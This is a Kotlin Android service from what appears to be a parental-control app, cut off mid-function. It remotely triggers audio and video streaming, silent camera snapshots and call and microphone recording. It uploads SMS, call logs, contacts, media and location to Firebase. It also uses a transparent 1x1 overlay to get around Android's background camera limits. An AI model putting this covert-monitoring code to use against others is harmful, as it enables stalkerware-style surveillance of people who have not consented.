package com.example.authapp.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import android.app.usage.UsageStatsManager
import android.graphics.PixelFormat
import android.view.WindowManager
import com.example.authapp.R
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.AppUsageInfo
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.UserLocation
import com.example.authapp.recorder.CallRecorder
import com.example.authapp.recorder.StreamAudioRecorder
import com.example.authapp.webrtc.WebRtcManager
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.ValueEventListener
import java.util.Calendar

class ChildForegroundService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private var locationRequestListener: ValueEventListener? = null
    private var webRtcManager: WebRtcManager? = null
    private var streamRequestListener: ValueEventListener? = null
    private var streamRecordingListener: ValueEventListener? = null
    private var streamAudioRecorder: StreamAudioRecorder? = null
    private var callRecorder: CallRecorder? = null
    private var sdpAnswerListener: ValueEventListener? = null
    private var parentCandidateListener: ChildEventListener? = null
    private var cameraFacingListener: ValueEventListener? = null
    private var snapshotRequestListener: ValueEventListener? = null
    private var recordingScheduleListener: ValueEventListener? = null
    private var parentControlsListener: ValueEventListener? = null
    private var remoteCommandsListener: ValueEventListener? = null
    private var geofencesListener: ValueEventListener? = null
    private var activeGeofences = listOf<com.example.authapp.data.GeofenceZone>()
    private var scheduledStopRunnable: Runnable? = null
    private var currentSessionId: String? = null
    private var isStreaming = false
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val candidateBuffer = mutableListOf<Map<String, Any>>()
    private val candidateHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var overlayView: android.view.View? = null
    private var studyModeOverlayView: android.view.View? = null
    private var heartbeatHandler: android.os.Handler? = null
    private var heartbeatRunnable: Runnable? = null
    private var currentServiceState: String = "IDLE_PROTECTED"
    private var networkMonitor: com.example.authapp.utils.NetworkHistoryMonitor? = null
    private var batteryReceiver: com.example.authapp.receiver.BatteryStatusReceiver? = null

    companion object {
        const val CHANNEL_ID = "ChildStreamChannel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START_MONITORING = "ACTION_START_MONITORING"
        const val ACTION_START = "ACTION_START_STREAM"
        const val ACTION_STOP = "ACTION_STOP_SERVICE"
        const val ACTION_STOP_STREAM = "ACTION_STOP_STREAM_ONLY"
        const val ACTION_START_CALL_RECORDING = "ACTION_START_CALL_RECORDING"
        const val ACTION_STOP_CALL_RECORDING = "ACTION_STOP_CALL_RECORDING"
        const val ACTION_SCHEDULED_RECORDING = "ACTION_SCHEDULED_RECORDING"
        const val EXTRA_STREAM_TYPE = "EXTRA_STREAM_TYPE"
        const val EXTRA_SESSION_ID = "EXTRA_SESSION_ID"
        const val EXTRA_PHONE_NUMBER = "EXTRA_PHONE_NUMBER"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        startLocationMonitoring()
        startHeartbeatTimer()

        networkMonitor = com.example.authapp.utils.NetworkHistoryMonitor(this).apply { startMonitoring() }
        com.example.authapp.receiver.SimChangeReceiver.checkAndSyncSimState(this)

        try {
            batteryReceiver = com.example.authapp.receiver.BatteryStatusReceiver()
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_BATTERY_LOW)
                addAction(Intent.ACTION_POWER_CONNECTED)
                addAction(Intent.ACTION_POWER_DISCONNECTED)
            }
            // ✅ FIX: RECEIVER_NOT_EXPORTED required for Android 14+ (targetSdk 34+)
            ContextCompat.registerReceiver(this, batteryReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] BatteryReceiver register error: ${e.localizedMessage}")
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildService:WakeLock")?.apply {
                acquire(12 * 60 * 60 * 1000L)
            }
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            wifiLock = wm?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "ChildService:WifiLock")?.apply {
                acquire()
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] WakeLock acquire error: ${e.localizedMessage}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (_: Exception) {}
        wakeLock = null
        wifiLock = null
    }

    private fun startHeartbeatTimer() {
        heartbeatHandler = android.os.Handler(android.os.Looper.getMainLooper())
        heartbeatRunnable = object : Runnable {
            override fun run() {
                val state = if (isStreaming) currentServiceState else "IDLE_PROTECTED"
                AppHealthTelemetry.sendHeartbeat(applicationContext, state)
                heartbeatHandler?.postDelayed(this, 60000L)
            }
        }
        heartbeatHandler?.postDelayed(heartbeatRunnable!!, 60000L)
    }

    private fun hasOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.provider.Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun ensureOverlayWindow() {
        if (overlayView != null) return
        if (!hasOverlayPermission()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] ensureOverlayWindow: SYSTEM_ALERT_WINDOW permission missing, cannot add overlay")
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "OVERLAY_WINDOW",
                "PERMISSION_DENIED",
                "SYSTEM_ALERT_WINDOW not granted; foreground service alone may fail to capture camera on Android 11+"
            )
            return
        }
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager ?: return
            val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                android.view.WindowManager.LayoutParams.TYPE_PHONE
            }
            val params = android.view.WindowManager.LayoutParams(
                1, 1,
                layoutType,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSPARENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0
                y = 0
            }
            val view = android.view.View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
            }
            wm.addView(view, params)
            overlayView = view
            FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 transparent overlay window attached for camera compliance")
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "OVERLAY_WINDOW",
                "SUCCESS",
                "1x1 overlay window attached successfully"
            )
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "OVERLAY_WINDOW",
                "FAILED",
                "Failed to attach overlay window: ${e.localizedMessage}",
                e.message
            )
        }
    }

    private fun removeOverlayWindow() {
        overlayView?.let { view ->
            try {
                val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                wm?.removeView(view)
                FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 overlay window removed")
            } catch (_: Exception) {}
            overlayView = null
        }
    }

    private fun updateStudyModeOverlay(isActive: Boolean, message: String) {
        mainHandler.post {
            if (isActive) {
                if (studyModeOverlayView == null && hasOverlayPermission()) {
                    try {
                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
                        val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        } else {
                            @Suppress("DEPRECATION")
                            WindowManager.LayoutParams.TYPE_PHONE
                        }
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            layoutType,
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                            PixelFormat.TRANSLUCENT
                        )
                        val layout = android.widget.LinearLayout(this).apply {
                            orientation = android.widget.LinearLayout.VERTICAL
                            gravity = android.view.Gravity.CENTER
                            setBackgroundColor(android.graphics.Color.parseColor("#E6000000"))
                            setPadding(48, 48, 48, 48)

                            val icon = android.widget.TextView(this@ChildForegroundService).apply {
                                text = "🔒"
                                textSize = 48f
                                gravity = android.view.Gravity.CENTER
                            }
                            val title = android.widget.TextView(this@ChildForegroundService).apply {
                                text = "Study Mode Active"
                                textSize = 24f
                                setTextColor(android.graphics.Color.WHITE)
                                setTypeface(null, android.graphics.Typeface.BOLD)
                                gravity = android.view.Gravity.CENTER
                                setPadding(0, 24, 0, 12)
                            }
                            val subtitle = android.widget.TextView(this@ChildForegroundService).apply {
                                text = message.ifEmpty { "Focus on your studies! This device is locked by your parent." }
                                textSize = 16f
                                setTextColor(android.graphics.Color.LTGRAY)
                                gravity = android.view.Gravity.CENTER
                            }
                            addView(icon)
                            addView(title)
                            addView(subtitle)
                        }
                        wm.addView(layout, params)
                        studyModeOverlayView = layout
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay displayed")
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay Error: ${e.localizedMessage}")
                    }
                }
            } else {
                studyModeOverlayView?.let { view ->
                    try {
                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                        wm?.removeView(view)
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay removed")
                    } catch (_: Exception) {}
                    studyModeOverlayView = null
                }
            }
        }
    }

    private fun syncAppUsageStats(uid: String) {
        if (uid.isEmpty()) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
                val cal = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, 0)
                    set(Calendar.MINUTE, 0)
                    set(Calendar.SECOND, 0)
                }
                val startTime = cal.timeInMillis
                val endTime = System.currentTimeMillis()
                val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
                val pm = packageManager
                val usageList = mutableListOf<AppUsageInfo>()
                for (stat in stats) {
                    val totalMins = stat.totalTimeInForeground / (1000 * 60)
                    if (totalMins > 0) {
                        val appName = try {
                            val appInfo = pm.getApplicationInfo(stat.packageName, 0)
                            pm.getApplicationLabel(appInfo).toString()
                        } catch (_: Exception) {
                            stat.packageName.substringAfterLast(".")
                        }
                        usageList.add(
                            AppUsageInfo(
                                packageName = stat.packageName,
                                appName = appName,
                                totalTimeInForegroundMinutes = totalMins,
                                lastTimeUsed = stat.lastTimeUsed
                            )
                        )
                    }
                }
                if (usageList.isNotEmpty()) {
                    FirebaseRepository.syncAppUsage(uid, usageList)
                }
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] App Usage sync notice: ${e.localizedMessage}")
            }
        }
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasMicrophonePermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun getIdleServiceType(): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return type
    }

    private fun getStreamingServiceType(streamType: String): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasMicrophonePermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (hasCameraPermission() && streamType.equals("video", ignoreCase = true)) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return type
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val streamType = intent.getStringExtra(EXTRA_STREAM_TYPE) ?: "audio"
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                val durationMinutes = intent.getIntExtra("duration_minutes", 0)

                // Enforce scheduled auto-stop if duration was provided
                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
                scheduledStopRunnable = null
                if (durationMinutes > 0) {
                    scheduledStopRunnable = Runnable {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled stream auto-stopping after $durationMinutes min")
                        stopStream()
                    }
                    mainHandler.postDelayed(scheduledStopRunnable!!, durationMinutes * 60 * 1000L)
                }

                if (streamType.equals("video", ignoreCase = true)) {
                    ensureOverlayWindow()
                }
                val serviceType = getStreamingServiceType(streamType)
                currentServiceState = if (streamType.equals("video", ignoreCase = true)) "STREAMING_VIDEO" else "STREAMING_AUDIO"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "LIVE_STREAM",
                    "STARTED",
                    "Stream command received ($streamType), session: $sessionId, duration: ${if (durationMinutes > 0) "$durationMinutes min" else "unlimited"}"
                )
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Active Remote Stream ($streamType)"),
                        serviceType
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground error: ${e.localizedMessage}")
                }
                startWebRtcStream(sessionId, streamType)
            }
            ACTION_START_MONITORING -> {
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground idle error: ${e.localizedMessage}")
                }
                startMonitoringStreamRequests()
            }
            ACTION_SCHEDULED_RECORDING -> {
                val durationMinutes = intent.getIntExtra("duration_minutes", 5)
                val scheduleId = intent.getStringExtra("schedule_id") ?: ""
                currentServiceState = "RECORDING_SCHEDULED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "SCHEDULED_RECORDING",
                    "STARTED",
                    "Scheduled recording started: schedule=$scheduleId, duration=$durationMinutes min"
                )
                // Ensure monitoring listeners are running (presence, RTDB, etc.)
                startMonitoringStreamRequests()
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Auto-Recording Active ($durationMinutes min)"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground scheduled error: ${e.localizedMessage}")
                }
                // Use CallRecorder for standalone mic capture (no WebRTC peer needed)
                if (callRecorder == null) {
                    callRecorder = CallRecorder(applicationContext)
                }
                callRecorder?.startCallRecording("scheduled_$scheduleId")
                // Auto-stop after durationMinutes
                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
                scheduledStopRunnable = Runnable {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording auto-stopping after $durationMinutes min")
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                        if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                    } ?: 0L
                    val recordedFile = callRecorder?.stopCallRecording()
                    callRecorder = null
                    currentServiceState = "IDLE_PROTECTED"
                    AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                    if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                        FirebaseRepository.saveRecordingSession(
                            childId = uid,
                            streamType = "scheduled",
                            durationSeconds = durationSec,
                            localFilePath = recordedFile.absolutePath
                        ) {
                            try {
                                FirebaseRepository.uploadRecordingFile(
                                    childId = uid,
                                    fileUri = android.net.Uri.fromFile(recordedFile),
                                    streamType = "scheduled",
                                    durationSeconds = durationSec,
                                    localFilePath = recordedFile.absolutePath
                                )
                                FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording uploaded to Cloud History")
                            } catch (e: Exception) {
                                FirebaseCrashlytics.getInstance().recordException(e)
                            }
                        }
                    }
                    scheduledStopRunnable = null
                }
                mainHandler.postDelayed(scheduledStopRunnable!!, durationMinutes * 60 * 1000L)
            }
            ACTION_START_CALL_RECORDING -> {
                val phoneNumber = intent.getStringExtra(EXTRA_PHONE_NUMBER) ?: "unknown"
                currentServiceState = "RECORDING_CALL"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "CALL_RECORDING",
                    "STARTED",
                    "Call recording initiated via foreground service for number: $phoneNumber"
                )
                if (callRecorder == null) {
                    callRecorder = CallRecorder(applicationContext)
                }
                callRecorder?.startCallRecording(phoneNumber)
            }
            ACTION_STOP_CALL_RECORDING -> {
                val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                    if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                } ?: 0L
                val recordedFile = callRecorder?.stopCallRecording()
                callRecorder = null
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)

                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "SUCCESS",
                        "Call audio captured locally (${durationSec}s, ${recordedFile.length()} bytes). Starting Cloud sync."
                    )
                    FirebaseRepository.saveRecordingSession(
                        childId = uid,
                        streamType = "call",
                        durationSeconds = durationSec,
                        localFilePath = recordedFile.absolutePath
                    ) {
                        try {
                            val fileUri = Uri.fromFile(recordedFile)
                            FirebaseRepository.uploadRecordingFile(
                                childId = uid,
                                fileUri = fileUri,
                                streamType = "call",
                                durationSeconds = durationSec,
                                localFilePath = recordedFile.absolutePath,
                                onSuccess = {
                                    AppHealthTelemetry.logDiagnostic(
                                        applicationContext,
                                        "CALL_RECORDING",
                                        "SUCCESS",
                                        "Call recording uploaded to Firebase Storage and synced to Parent History."
                                    )
                                },
                                onFailure = { err ->
                                    AppHealthTelemetry.logDiagnostic(
                                        applicationContext,
                                        "CALL_RECORDING",
                                        "FAILED",
                                        "Cloud upload failed: $err",
                                        err
                                    )
                                }
                            )
                        } catch (e: Exception) {
                            AppHealthTelemetry.logDiagnostic(
                                applicationContext,
                                "CALL_RECORDING",
                                "FAILED",
                                "Call upload error: ${e.localizedMessage}",
                                e.localizedMessage
                            )
                        }
                    }
                } else {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "FAILED",
                        "Call recording output was empty or failed to generate file"
                    )
                }
            }
            ACTION_STOP_STREAM -> {
                stopStream()
                streamAudioRecorder?.stopRecording()
                streamAudioRecorder = null
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground restore error: ${e.localizedMessage}")
                }
            }
            ACTION_STOP -> {
                currentServiceState = "STOPPED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                stopStream()
                callRecorder?.stopCallRecording()
                callRecorder = null
                streamAudioRecorder?.stopRecording()
                streamAudioRecorder = null
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
            else -> {
                val effectiveUid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                val isUserLoggedIn = FirebaseRepository.currentUser != null || effectiveUid.isNotEmpty()
                if (!isUserLoggedIn) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] No user logged in. Terminating service.")
                    stopStream()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    return START_NOT_STICKY
                }

                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground default error: ${e.localizedMessage}")
                }
                startMonitoringStreamRequests()
            }
        }
        return START_STICKY
    }

    private fun startMonitoringStreamRequests() {
        val uid = FirebaseRepository.currentUser?.uid?.takeIf { it.isNotEmpty() }
            ?: AppPreferences.getUserId(applicationContext).takeIf { it.isNotEmpty() }

        if (uid.isNullOrEmpty()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] User signed out or not found. Stopping background service.")
            stopStream()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }
        FirebaseRepository.setupPresenceSystem(uid)

        // Remote Recording Listener (Parent clicks 'Record' on remote stream)
        if (streamRecordingListener == null) {
            streamRecordingListener = FirebaseRepository.listenToRemoteRecording(uid) { isRecording, recType ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote recording command: isRecording=$isRecording, type=$recType")
                if (isRecording) {
                    if (streamAudioRecorder == null) {
                        streamAudioRecorder = StreamAudioRecorder(applicationContext)
                    }
                    streamAudioRecorder?.startRecording(recType)
                } else {
                    val durationSec = streamAudioRecorder?.recordingStartTimeMillis?.let {
                        if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                    } ?: 0L
                    val recordedFile = streamAudioRecorder?.stopRecording()
                    streamAudioRecorder = null
                    if (recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                        FirebaseRepository.saveRecordingSession(
                            childId = uid,
                            streamType = recType,
                            durationSeconds = durationSec,
                            localFilePath = recordedFile.absolutePath
                        ) {
                            try {
                                val fileUri = Uri.fromFile(recordedFile)
                                FirebaseRepository.uploadRecordingFile(
                                    childId = uid,
                                    fileUri = fileUri,
                                    streamType = recType,
                                    durationSeconds = durationSec,
                                    localFilePath = recordedFile.absolutePath
                                )
                                FirebaseCrashlytics.getInstance().log("[ChildService] Uploaded remote stream recording successfully")
                            } catch (e: Exception) {
                                FirebaseCrashlytics.getInstance().recordException(e)
                            }
                        }
                    }
                }
            }
        }

        // SIM Change Detection (Phase 2)
        com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext, uid)

        // Sync Call Logs (Phase 2)
        try {
            val callLogs = com.example.authapp.utils.CallLogUtils.getRecentCallLogs(applicationContext, limit = 30)
            if (callLogs.isNotEmpty()) {
                FirebaseRepository.syncCallLogs(uid, callLogs)
            }
        } catch (_: Exception) {}

        // Listen for Remote Snapshot requests (Phase 1)
        if (snapshotRequestListener == null) {
            snapshotRequestListener = FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
                val isFront = cameraFacing.equals("front", ignoreCase = true)
                com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                    isFront = isFront,
                    onCaptured = { file ->
                        FirebaseRepository.uploadSnapshot(
                            childId = uid,
                            fileUri = Uri.fromFile(file),
                            cameraFacing = cameraFacing,
                            onSuccess = {
                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
                                try { file.delete() } catch (_: Exception) {}
                            },
                            onFailure = { err ->
                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
                            }
                        )
                    },
                    onError = { err ->
                        FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                    }
                )
            }
        }

        // Listen for Recording Schedules (Phase 1)
        if (recordingScheduleListener == null) {
            var previousScheduleIds = emptySet<String>()
            recordingScheduleListener = FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
                val currentIds = schedules.map { it.id }.toSet()
                // Cancel alarms for schedules that were deleted from Firebase
                val deletedIds = previousScheduleIds - currentIds
                for (deletedId in deletedIds) {
                    com.example.authapp.scheduler.RecordingScheduler.cancelSchedule(applicationContext, deletedId)
                    FirebaseCrashlytics.getInstance().log("[ChildService] Cancelled deleted schedule alarm: $deletedId")
                }
                previousScheduleIds = currentIds
                // Set/update alarms for current schedules
                for (schedule in schedules) {
                    com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
                }
            }
        }

        // Listen for Parent Controls & Study Mode Freeze (Phase 3)
        if (parentControlsListener == null) {
            parentControlsListener = FirebaseRepository.listenToParentControls(uid) { settings ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Parent controls received: studyMode=${settings.isStudyModeActive}, blockedCount=${settings.blockedPackages.size}")
                updateStudyModeOverlay(settings.isStudyModeActive, settings.studyModeMessage)
            }
        }

        // Listen for Geofence Zones (Phase 4)
        if (geofencesListener == null) {
            geofencesListener = FirebaseRepository.listenToGeofences(uid) { zones ->
                activeGeofences = zones
            }
        }

        // Listen for Remote Hardware Commands: Torch & Siren (Phase 4)
        if (remoteCommandsListener == null) {
            remoteCommandsListener = FirebaseRepository.listenToRemoteCommands(uid) { command, value ->
                when (command) {
                    "TORCH" -> {
                        val enable = value == true || value == "true"
                        RemoteActionsManager.setTorch(applicationContext, enable)
                    }
                    "SIREN" -> {
                        val enable = value == true || value == "true"
                        if (enable) RemoteActionsManager.playSiren(applicationContext, 30)
                        else RemoteActionsManager.stopSiren()
                    }
                }
            }
        }

        // Sync SMS Messages (Phase 4)
        try {
            val smsList = com.example.authapp.utils.SmsUtils.getRecentSms(applicationContext, limit = 30)
            if (smsList.isNotEmpty()) {
                FirebaseRepository.syncSmsLogs(uid, smsList)
            }
        } catch (_: Exception) {}

        // Check for newly added contacts (Phase 4)
        try {
            com.example.authapp.utils.ContactsMonitor.checkNewContacts(applicationContext, uid)
        } catch (_: Exception) {}

        // Sync Gallery & Media item metadata (Phase 4)
        try {
            com.example.authapp.utils.MediaBackupManager.syncRecentMedia(applicationContext, uid)
        } catch (_: Exception) {}

        // Sync real-time App Usage to Firebase
        syncAppUsageStats(uid)

        if (streamRequestListener != null) return

        FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
        streamRequestListener = FirebaseRepository.listenToStreamRequests(
            childId = uid,
            onRequested = { streamType, sessionId ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Stream request received over RTDB: $streamType, session: $sessionId")
                if (!isStreaming || currentSessionId != sessionId) {
                    if (streamType.equals("video", ignoreCase = true)) {
                        ensureOverlayWindow()
                    }
                    val serviceType = getStreamingServiceType(streamType)
                    try {
                        ServiceCompat.startForeground(
                            this,
                            NOTIFICATION_ID,
                            buildNotification("Active Remote Stream ($streamType)"),
                            serviceType
                        )
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] startForeground stream error: ${e.localizedMessage}")
                    }
                    startWebRtcStream(sessionId, streamType)
                }
            },
            onStopped = {
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote stream stopped by Parent")
                stopStream()
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground restore error: ${e.localizedMessage}")
                }
            }
        )
    }

    private fun startWebRtcStream(sessionId: String, streamType: String) {
        if (isStreaming && currentSessionId == sessionId) return
        stopStream()

        currentSessionId = sessionId
        isStreaming = true
        acquireWakeLock()

        // Update RTDB to STREAMING so parent reconnecting sees the active session
        val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
        if (uid.isNotEmpty()) {
            try {
                // ✅ FIX: Hardcoded RTDB URL hata diya - FirebaseRepository use karta hai correct instance
                FirebaseRepository.updateStreamStatus(uid, "STREAMING", streamType, sessionId)
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] STREAMING status update failed: ${e.localizedMessage}")
            }
        }

        if (streamType.equals("video", ignoreCase = true)) {
            ensureOverlayWindow()
        }

        try {
            // Configure hardware microphone routing for WebRTC
            try {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
